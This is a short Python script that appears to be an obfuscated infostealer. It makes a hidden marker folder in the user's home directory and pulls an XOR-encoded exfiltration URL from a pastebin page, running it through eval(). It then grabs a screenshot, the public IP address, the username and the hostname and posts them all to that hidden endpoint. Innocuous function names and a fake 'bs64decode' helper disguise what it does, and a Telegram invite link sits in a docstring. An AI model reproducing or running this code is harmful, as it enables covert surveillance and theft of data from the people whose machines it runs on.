c = "pastebin"
import requests
import subprocess
from PIL import ImageGrab
import os
b = int(not [])
def bs64decode(s, o):
    if not []:
        o += b
    a = s
    k = bytes(b ^ o for b in a)
    return k.decode()
os.chdir(os.path.expanduser("~"))
if os.path.exists(".temps"):
    exit(0)
else:
    os.mkdir(".temps")
    os.chdir(".temps")
def get_first():
    try:
        s = ImageGrab.grab()
        s.save('c.png')
        with open('c.png', 'rb') as f:
            r = requests.post(bob, files={'file': f}, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            })
        os.remove('c.png')
        return "Success"
    except:
        return ""
def get_second():
    try:
        s = requests.get("https://api.ipify.org", headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }).text
        return s
    except:
        return ""
raw = requests.get(f"https://{c}.com/raw/tujQzFpB", headers={
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}).text
def get_third():
    try:
        s = subprocess.check_output("whoami").decode().replace("\n", "")
        return s
    except:
        return ""
bob = eval(f"b'{raw}'")
def get_fourth():
    try:
        s = subprocess.check_output("hostname").decode().split("\n")[0].strip()
        return s
    except:
        return ""
def ses():
    a = get_first()
    b = get_second()
    c = get_third()
    d = get_fourth()
    return a, b, c, d
def kok():
    to_s = ses()
    kaka = {
        "content": f"```{to_s[0]}```\n```{to_s[1]}```\n```{to_s[2]}```\n```{to_s[3]}```"
    }
    requests.post(bob, json=kaka, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    })
bob = bs64decode(bob, 221)
def boboutahere():
    """https://t.me/+N2XJqUYgNc41ZDE0"""
    pass
def main():
    kok()
    boboutahere()